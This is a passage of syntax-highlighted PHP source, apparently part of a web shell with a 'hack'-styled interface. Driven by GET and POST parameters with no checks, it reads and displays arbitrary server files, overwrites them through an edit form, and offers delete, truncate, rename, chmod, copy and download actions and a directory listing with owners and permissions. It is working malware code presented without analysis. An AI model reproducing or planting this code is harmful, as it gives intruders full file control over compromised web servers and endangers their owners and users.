<span class="lineno">1946</span> <span class="s2">echo &quot;</span><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=&quot;</span><span class="o">.@</span><span class="nv">$e</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1947</span> <span class="k">exit</span><span class="p">;</span>
<span class="lineno">1948</span> <span class="p">}</span>
<span class="lineno">1949</span> 
<span class="lineno">1950</span> 
<span class="lineno">1951</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">]){</span>
<span class="lineno">1952</span> <span class="nv">$d</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">];</span>
<span class="lineno">1953</span> <span class="nv">$e</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">];</span>
<span class="lineno">1954</span> <span class="nv">$pinf</span><span class="o">=</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$e</span><span class="p">);</span>
<span class="lineno">1955</span> <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="o">.@</span><span class="nv">$pinf</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">],</span><span class="nv">$images</span><span class="p">)){</span>
<span class="lineno">1956</span> <span class="k">echo</span> <span class="s2">&quot;&lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&amp;img=1</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1957</span> <span class="k">exit</span><span class="p">;}</span>
<span class="lineno">1958</span> <span class="nv">$filename</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$e</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1959</span> <span class="nv">$fd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span> <span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">);</span>
<span class="lineno">1960</span> <span class="nv">$c</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fread</span> <span class="p">(</span><span class="nv">$fd</span><span class="p">,</span> <span class="o">@</span><span class="nb">filesize</span> <span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
<span class="lineno">1961</span> <span class="nv">$c</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
<span class="lineno">1962</span> <span class="nv">$de</span><span class="o">=</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">;</span>
<span class="lineno">1963</span> <span class="nv">$de</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$de</span><span class="p">);</span>
<span class="lineno">1964</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$de</span><span class="p">)){</span>
<span class="lineno">1965</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$de</span><span class="p">)){</span><span class="k">echo</span> <span class="s2">&quot;&lt;font color=red&gt;READ ONLY&lt;/font&gt;&lt;br&gt;&quot;</span><span class="p">;}}</span>
<span class="lineno">1966</span> <span class="k">echo</span> <span class="s2">&quot;[&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;del_f=1&amp;wich_f=</span><span class="si">$e</span><span class="s2">&#39;&gt;Delete&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ef=</span><span class="si">$e</span><span class="s2">&amp;edit=1&#39;&gt;Edit&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&amp;clean=1&#39;&gt;Filesize to 0 byte&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&amp;replace=1&#39;&gt;Replace text in file&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;download=</span><span class="si">$e</span><span class="s2">&#39;&gt;Download&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;rename=1&amp;wich_f=</span><span class="si">$e</span><span class="s2">&#39;&gt;Rename&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;chmod=1&amp;wich_f=</span><span class="si">$e</span><span class="s2">&#39;&gt;CHMOD&lt;/a&gt;] [&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ccopy_to=</span><span class="si">$e</span><span class="s2">&#39;&gt;Copy&lt;/a&gt;]&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1967</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno">1968</span> <span class="s2">File contents:&lt;br&gt;</span>
<span class="lineno">1969</span> <span class="si">$de</span><span class="s2"></span>
<span class="lineno">1970</span> <span class="s2">&lt;br&gt;</span>
<span class="lineno">1971</span> <span class="s2">&lt;table width=100% border=1 cellpadding=0 cellspacing=0&gt;</span>
<span class="lineno">1972</span> <span class="s2">&lt;tr&gt;&lt;td&gt;&lt;pre&gt;</span>
<span class="lineno">1973</span> <span class="si">$c</span><span class="s2"></span>
<span class="lineno">1974</span> 
<span class="lineno">1975</span> <span class="s2">&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1976</span> <span class="s2">&lt;/table&gt;</span>
<span class="lineno">1977</span> 
<span class="lineno">1978</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1979</span> 
<span class="lineno">1980</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;1&quot;</span><span class="p">){</span>
<span class="lineno">1981</span> <span class="nv">$delete</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete&#39;</span><span class="p">];</span>
<span class="lineno">1982</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno">1983</span> <span class="s2">DELETE: Are you sure?&lt;br&gt;</span>
<span class="lineno">1984</span> <span class="s2">&lt;a href=</span><span class="se">\&quot;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&amp;delete=&quot;</span><span class="o">.@</span><span class="nv">$delete</span><span class="o">.</span><span class="s2">&quot;&amp;yes=yes</span><span class="se">\&quot;</span><span class="s2">&gt;Yes&lt;/a&gt; || &lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?no=1&#39;&gt;No&lt;/a&gt;</span>
<span class="lineno">1985</span> <span class="s2">&lt;br&gt;</span>
<span class="lineno">1986</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1987</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;yes&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;yes&quot;</span><span class="p">){</span>
<span class="lineno">1988</span> <span class="o">@</span><span class="nv">$d</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">];</span> <span class="o">@</span><span class="nv">$e</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">];</span>
<span class="lineno">1989</span> <span class="k">echo</span> <span class="nv">$delresult</span><span class="p">;</span>
<span class="lineno">1990</span> <span class="p">}</span>
<span class="lineno">1991</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;no&#39;</span><span class="p">]){</span>
<span class="lineno">1992</span> <span class="k">echo</span> <span class="s2">&quot;&lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e\</span><span class="s2">&quot;</span><span class="o">&gt;</span>
<span class="lineno">1993</span> <span class="s2">&quot;;</span>
<span class="lineno">1994</span> <span class="s2">}</span>
<span class="lineno">1995</span> 
<span class="lineno">1996</span> 
<span class="lineno">1997</span> <span class="s2">} #end of delete</span>
<span class="lineno">1998</span> <span class="s2">echo </span><span class="si">$copyr</span><span class="s2">;</span>
<span class="lineno">1999</span> <span class="s2">exit;</span>
<span class="lineno">2000</span> <span class="s2">} #end of e</span>
<span class="lineno">2001</span> 
<span class="lineno">2002</span> <span class="s2">if(@</span><span class="si">$_GET[&#39;edit&#39;]</span><span class="s2">==&quot;</span><span class="mi">1</span><span class="s2">&quot;){</span>
<span class="lineno">2003</span> <span class="s2">@</span><span class="si">$d</span><span class="s2">=</span><span class="si">$_GET[&#39;d&#39;]</span><span class="s2">;</span>
<span class="lineno">2004</span> <span class="s2">@</span><span class="si">$ef</span><span class="s2">=</span><span class="si">$_GET[&#39;ef&#39;]</span><span class="s2">;</span>
<span class="lineno">2005</span> <span class="si">$e</span><span class="s2">=</span><span class="si">$ef</span><span class="s2">;</span>
<span class="lineno">2006</span> <span class="s2">if(is_file(</span><span class="si">$d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$ef</span><span class="s2">)){</span>
<span class="lineno">2007</span> <span class="s2">if(!is_writable(</span><span class="si">$d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$ef</span><span class="s2">)){echo &quot;</span><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&gt;</span><span class="nx">READ</span> <span class="nx">ONLY</span><span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;;}}</span>
<span class="lineno">2008</span> <span class="s2">echo &quot;</span><span class="p">[</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;del_f=1&amp;wich_f=$e&#39;</span><span class="o">&gt;</span><span class="nx">Delete</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;ef=$e&amp;edit=1&#39;</span><span class="o">&gt;</span><span class="nx">Edit</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;e=$e&amp;clean=1&#39;</span><span class="o">&gt;</span><span class="nx">Filesize</span> <span class="nx">to</span> <span class="mi">0</span> <span class="nx">byte</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;e=$e&amp;replace=1&#39;</span><span class="o">&gt;</span><span class="nx">Replace</span> <span class="nx">text</span> <span class="nx">in</span> <span class="nb">file</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;download=$e&#39;</span><span class="o">&gt;</span><span class="nx">Download</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;rename=1&amp;wich_f=$e&#39;</span><span class="o">&gt;</span><span class="nx">Rename</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;chmod=1&amp;wich_f=$e&#39;</span><span class="o">&gt;</span><span class="nx">CHMOD</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;ccopy_to=$e&#39;</span><span class="o">&gt;</span><span class="nx">Copy</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span><span class="p">]</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">2009</span> <span class="si">$filename</span><span class="s2">=&quot;</span><span class="nv">$d</span><span class="o">/</span><span class="nv">$ef</span><span class="s2">&quot;;</span>
<span class="lineno">2010</span> <span class="si">$fd</span><span class="s2"> = @fopen (</span><span class="si">$filename</span><span class="s2">, &quot;</span><span class="nx">r</span><span class="s2">&quot;);</span>
<span class="lineno">2011</span> <span class="si">$c</span><span class="s2"> = @fread (</span><span class="si">$fd</span><span class="s2">, @filesize (</span><span class="si">$filename</span><span class="s2">));</span>
<span class="lineno">2012</span> <span class="si">$c</span><span class="s2">=htmlspecialchars(</span><span class="si">$c</span><span class="s2">);</span>
<span class="lineno">2013</span> <span class="si">$de</span><span class="s2">=</span><span class="si">$d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$ef</span><span class="s2">;</span>
<span class="lineno">2014</span> <span class="si">$de</span><span class="s2">=str_replace(&quot;</span><span class="c1">//&quot;,&quot;/&quot;,$de);</span>
<span class="lineno">2015</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno">2016</span> <span class="s2">Edit:&lt;br&gt;</span>
<span class="lineno">2017</span> <span class="si">$de</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2018</span> 
<span class="lineno">2019</span> <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save&#39;</span><span class="p">]){</span>
<span class="lineno">2020</span> <span class="k">print</span> <span class="s2">&quot;</span>
<span class="lineno">2021</span> <span class="s2">&lt;form method=post&gt;</span>
<span class="lineno">2022</span> <span class="s2">&lt;input name=filename value=&#39;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$ef</span><span class="s2">&#39;&gt;</span>
<span class="lineno">2023</span> <span class="s2">&lt;textarea cols=143 rows=30 name=editf&gt;</span><span class="si">$c</span><span class="s2">&lt;/textarea&gt;</span>
<span class="lineno">2024</span> <span class="s2">&lt;br&gt;</span>
<span class="lineno">2025</span> <span class="s2">&lt;input type=submit name=save value=&#39;Save changes&#39;&gt;&lt;/form&gt;&lt;br&gt;</span>
<span class="lineno">2026</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2027</span> <span class="p">}</span>
<span class="lineno">2028</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save&#39;</span><span class="p">]){</span>
<span class="lineno">2029</span> <span class="nv">$editf</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;editf&#39;</span><span class="p">];</span>
<span class="lineno">2030</span> 
<span class="lineno">2031</span> <span class="k">if</span><span class="p">(</span><span class="nb">get_magic_quotes_runtime</span><span class="p">()</span> <span class="k">or</span> <span class="nb">get_magic_quotes_gpc</span><span class="p">()){</span>
<span class="lineno">2032</span> <span class="nv">$editf</span><span class="o">=</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$editf</span><span class="p">);</span>
<span class="lineno">2033</span> <span class="p">}</span>
<span class="lineno">2034</span> 
<span class="lineno">2035</span> <span class="nv">$f</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="s2">&quot;w+&quot;</span><span class="p">);</span>
<span class="lineno">2036</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$editf</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">2037</span> <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;</span>
<span class="lineno">2038</span> <span class="s2">&lt;b&gt;File edited.&lt;/b&gt;</span>
<span class="lineno">2039</span> <span class="s2">&lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$ef\</span><span class="s2">&quot;</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">2040</span> <span class="s2">exit;</span>
<span class="lineno">2041</span> <span class="s2">}</span>
<span class="lineno">2042</span> <span class="s2">echo </span><span class="si">$copyr</span><span class="s2">;</span>
<span class="lineno">2043</span> <span class="s2">exit;</span>
<span class="lineno">2044</span> <span class="s2">}</span>
<span class="lineno">2045</span> 
<span class="lineno">2046</span> 
<span class="lineno">2047</span> 
<span class="lineno">2048</span> <span class="s2">echo&quot;</span>
<span class="lineno">2049</span> <span class="o">&lt;</span><span class="nx">table</span> <span class="nx">width</span><span class="o">=</span><span class="mi">100</span><span class="o">%</span> <span class="nx">cellpadding</span><span class="o">=</span><span class="mi">1</span> <span class="nx">cellspacing</span><span class="o">=</span><span class="mi">0</span> <span class="nx">class</span><span class="o">=</span><span class="nx">hack</span><span class="o">&gt;</span>
<span class="lineno">2050</span> <span class="o">&lt;</span><span class="nx">tr</span><span class="o">&gt;&lt;</span><span class="nx">td</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="c1">#519A00&gt;&lt;center&gt;&lt;b&gt;Filename&lt;/b&gt;&lt;/td&gt;&lt;td bgcolor=#519A00&gt;&lt;center&gt;&lt;b&gt;Tools&lt;/b&gt;&lt;/td&gt;&lt;td bgcolor=#519A00&gt;&lt;b&gt;Size&lt;/b&gt;&lt;/td&gt;&lt;td bgcolor=#519A00&gt;&lt;center&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td bgcolor=#519A00&gt;&lt;b&gt;Perms&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">2051</span> <span class="s2">&quot;;</span>
<span class="lineno">2052</span> <span class="si">$dirs</span><span class="s2">=array();</span>
<span class="lineno">2053</span> <span class="si">$files</span><span class="s2">=array();</span>
<span class="lineno">2054</span> <span class="si">$dh</span><span class="s2"> = @opendir(</span><span class="si">$d</span><span class="s2">) or die(&quot;</span><span class="o">&lt;</span><span class="nx">table</span> <span class="nx">width</span><span class="o">=</span><span class="mi">100</span><span class="o">%&gt;&lt;</span><span class="nx">tr</span><span class="o">&gt;&lt;</span><span class="nx">td</span><span class="o">&gt;&lt;</span><span class="nx">center</span><span class="o">&gt;</span><span class="nx">Permission</span> <span class="nx">Denied</span> <span class="k">or</span> <span class="nx">Folder</span><span class="o">/</span><span class="nx">Disk</span> <span class="nx">does</span> <span class="k">not</span> <span class="nx">exist</span><span class="o">&lt;/</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="nv">$copyr</span><span class="o">&lt;/</span><span class="nx">td</span><span class="o">&gt;&lt;/</span><span class="nx">tr</span><span class="o">&gt;&lt;/</span><span class="nx">table</span><span class="o">&gt;</span><span class="s2">&quot;);</span>
<span class="lineno">2055</span> <span class="s2">while (!((</span><span class="si">$file</span><span class="s2"> = readdir(</span><span class="si">$dh</span><span class="s2">)) === false)) {</span>
<span class="lineno">2056</span> <span class="s2">if (</span><span class="si">$file</span><span class="s2">==&quot;</span><span class="o">.</span><span class="s2">&quot; || </span><span class="si">$file</span><span class="s2">==&quot;</span><span class="o">..</span><span class="s2">&quot;) continue;</span>
<span class="lineno">2057</span> <span class="s2">if (@is_dir(&quot;</span><span class="nv">$d</span><span class="o">/</span><span class="nv">$file</span><span class="s2">&quot;)) {</span>
<span class="lineno">2058</span> <span class="s2">      </span><span class="si">$dirs</span><span class="s2">[]=</span><span class="si">$file</span><span class="s2">;</span>
<span class="lineno">2059</span> <span class="s2">}else{</span>
<span class="lineno">2060</span> <span class="s2">      </span><span class="si">$files</span><span class="s2">[]=</span><span class="si">$file</span><span class="s2">;</span>
<span class="lineno">2061</span> <span class="s2">      }</span>
<span class="lineno">2062</span> <span class="s2">   sort(</span><span class="si">$dirs</span><span class="s2">);</span>
<span class="lineno">2063</span> <span class="s2">   sort(</span><span class="si">$files</span><span class="s2">);</span>
<span class="lineno">2064</span> 
<span class="lineno">2065</span> <span class="si">$fz</span><span class="s2">=@filesize(&quot;</span><span class="nv">$d</span><span class="o">/</span><span class="nv">$file</span><span class="s2">&quot;);</span>
<span class="lineno">2066</span> <span class="s2">}</span>
<span class="lineno">2067</span> 
<span class="lineno">2068</span> <span class="s2">function perm(</span><span class="si">$perms</span><span class="s2">){</span>
<span class="lineno">2069</span> <span class="s2">if ((</span><span class="si">$perms</span><span class="s2"> &amp; 0xC000) == 0xC000) {</span>
<span class="lineno">2070</span> <span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;s&#39;;</span>
<span class="lineno">2071</span> <span class="s2">} elseif ((</span><span class="si">$perms</span><span class="s2"> &amp; 0xA000) == 0xA000) {</span>
<span class="lineno">2072</span> <span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;l&#39;;</span>
<span class="lineno">2073</span> <span class="s2">} elseif ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x8000) == 0x8000) {</span>
<span class="lineno">2074</span> <span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;-&#39;;</span>
<span class="lineno">2075</span> <span class="s2">} elseif ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x6000) == 0x6000) {</span>
<span class="lineno">2076</span> <span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;b&#39;;</span>
<span class="lineno">2077</span> <span class="s2">} elseif ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x4000) == 0x4000) {</span>
<span class="lineno">2078</span> <span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;d&#39;;</span>
<span class="lineno">2079</span> <span class="s2">} elseif ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x2000) == 0x2000) {</span>
<span class="lineno">2080</span> <span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;c&#39;;</span>
<span class="lineno">2081</span> <span class="s2">} elseif ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x1000) == 0x1000) {</span>
<span class="lineno">2082</span> <span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;p&#39;;</span>
<span class="lineno">2083</span> <span class="s2">} else {</span>
<span class="lineno">2084</span> <span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;u&#39;;</span>
<span class="lineno">2085</span> <span class="s2">}</span>
<span class="lineno">2086</span> <span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0100) ? &#39;r&#39; : &#39;-&#39;);</span>
<span class="lineno">2087</span> <span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0080) ? &#39;w&#39; : &#39;-&#39;);</span>
<span class="lineno">2088</span> <span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0040) ?</span>
<span class="lineno">2089</span> <span class="s2">           ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0800) ? &#39;s&#39; : &#39;x&#39; ) :</span>
<span class="lineno">2090</span> <span class="s2">           ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0800) ? &#39;S&#39; : &#39;-&#39;));</span>
<span class="lineno">2091</span> <span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0020) ? &#39;r&#39; : &#39;-&#39;);</span>
<span class="lineno">2092</span> <span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0010) ? &#39;w&#39; : &#39;-&#39;);</span>
<span class="lineno">2093</span> <span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0008) ?</span>
<span class="lineno">2094</span> <span class="s2">           ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0400) ? &#39;s&#39; : &#39;x&#39; ) :</span>
<span class="lineno">2095</span> <span class="s2">           ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0400) ? &#39;S&#39; : &#39;-&#39;));</span>
<span class="lineno">2096</span> <span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0004) ? &#39;r&#39; : &#39;-&#39;);</span>
<span class="lineno">2097</span> <span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0002) ? &#39;w&#39; : &#39;-&#39;);</span>
<span class="lineno">2098</span> <span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0001) ?</span>
<span class="lineno">2099</span> <span class="s2">           ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0200) ? &#39;t&#39; : &#39;x&#39; ) :</span>
<span class="lineno">2100</span> <span class="s2">           ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0200) ? &#39;T&#39; : &#39;-&#39;));</span>
<span class="lineno">2101</span> <span class="s2">return </span><span class="si">$info</span><span class="s2">;</span>
<span class="lineno">2102</span> <span class="s2">}</span>
<span class="lineno">2103</span> 
<span class="lineno">2104</span> 
<span class="lineno">2105</span> <span class="s2">for(</span><span class="si">$i</span><span class="s2">=0; </span><span class="si">$i</span><span class="s2">&lt;count(</span><span class="si">$dirs</span><span class="s2">); </span><span class="si">$i</span><span class="s2">++){</span>
<span class="lineno">2106</span> 
<span class="lineno">2107</span> <span class="si">$perms</span><span class="s2"> = @fileperms(</span><span class="si">$d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$dirs[$i]</span><span class="s2">);</span>
<span class="lineno">2108</span> <span class="si">$owner</span><span class="s2"> = @fileowner(</span><span class="si">$d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$dirs[$i]</span><span class="s2">);</span>
<span class="lineno">2109</span> <span class="s2">if(</span><span class="si">$os</span><span class="s2">==&quot;</span><span class="nx">unix</span><span class="s2">&quot;){</span>
<span class="lineno">2110</span> <span class="si">$fileownera</span><span class="s2">=posix_getpwuid(</span><span class="si">$owner</span><span class="s2">);</span>
<span class="lineno">2111</span> <span class="si">$owner</span><span class="s2">=</span><span class="si">$fileownera[&#39;name&#39;]</span><span class="s2">;</span>
<span class="lineno">2112</span> <span class="s2">}</span>
<span class="lineno">2113</span> <span class="si">$group</span><span class="s2"> = @filegroup(</span><span class="si">$d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$dirs[$i]</span><span class="s2">);</span>
<span class="lineno">2114</span> <span class="s2">if(</span><span class="si">$os</span><span class="s2">==&quot;</span><span class="nx">unix</span><span class="s2">&quot;){</span>
<span class="lineno">2115</span> <span class="si">$groupinfo</span><span class="s2"> = posix_getgrgid(</span><span class="si">$group</span><span class="s2">);</span>
<span class="lineno">2116</span> <span class="si">$group</span><span class="s2">=</span><span class="si">$groupinfo[&#39;name&#39;]</span><span class="s2">;</span>
<span class="lineno">2117</span> <span class="s2">}</span>
<span class="lineno">2118</span> <span class="si">$info</span><span class="s2">=perm(</span><span class="si">$perms</span><span class="s2">);</span>
<span class="lineno">2119</span> <span class="s2">if(</span><span class="si">$i</span><span class="s2">%2)</span><span class="si">{</span><span class="nv">$color</span><span class="o">=</span><span class="s2">&quot;#D7FFA8&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2">else</span><span class="si">{</span><span class="nv">$color</span><span class="o">=</span><span class="s2">&quot;#D1D1D1&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
